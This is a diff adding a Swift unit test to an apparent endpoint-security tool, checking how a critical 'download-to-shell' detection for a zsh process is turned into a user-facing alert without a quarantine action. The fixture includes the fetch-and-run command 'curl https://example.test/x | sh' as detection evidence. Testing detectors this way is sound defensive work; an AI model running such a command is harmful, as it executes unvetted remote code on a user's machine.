@@ -7,6 +7,51 @@ import XCTest
 
 final class UserFacingAlertBuilderTests: XCTestCase {
 
+    func test_behaviorIncidentOnPlatformShellHasNoFileRemediationAction() {
+        let process = NickProcessInfo(
+            pid: 1_842,
+            path: "/bin/zsh",
+            name: "zsh",
+            parentPID: 1_060,
+            parentName: "CodexCLI",
+            signingStatus: .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh"),
+            metadata: ProcessMetadata(arguments: [])
+        )
+        let signal = ThreatSignal(
+            source: .endpointSecurity,
+            severity: .critical,
+            title: "Download-to-shell command detected",
+            description: "Behavior evidence",
+            context: ThreatSignalContext(
+                processInfo: process,
+                fileInfo: FileInfo(path: "/bin/zsh", sha256Hash: nil, entropy: nil, signingStatus: nil, sizeBytes: nil),
+                metadata: [
+                    "reason": "curl_pipe_shell",
+                    "class": "behavior",
+                    "detectionKind": "lolbin-behavior",
+                    "matchedCommand": "curl https://example.test/x | sh"
+                ]
+            )
+        )
+        let alert = ThreatAlert(
+            score: 0.9,
+            content: AlertContent(
+                title: "Download-to-shell command detected",
+                description: "Behavior evidence",
+                severity: .critical,
+                recommendedAction: "Review"
+            ),
+            contributingSignals: [signal]
+        )
+
+        let result = UserFacingAlertBuilder.shared.build(from: alert)
+
+        XCTAssertNil(alert.remediableFilePath)
+        XCTAssertFalse(result.actions.contains(.quarantine))
+        XCTAssertTrue(result.explanation.contains("Nick saw a shell run"))
+        XCTAssertFalse(result.explanation.lowercased().contains("file content"))
+    }
+
     func test_eicarDetectionUsesExplicitTestFileLabel() {
         let alert = ThreatAlert(
             score: 0.9,
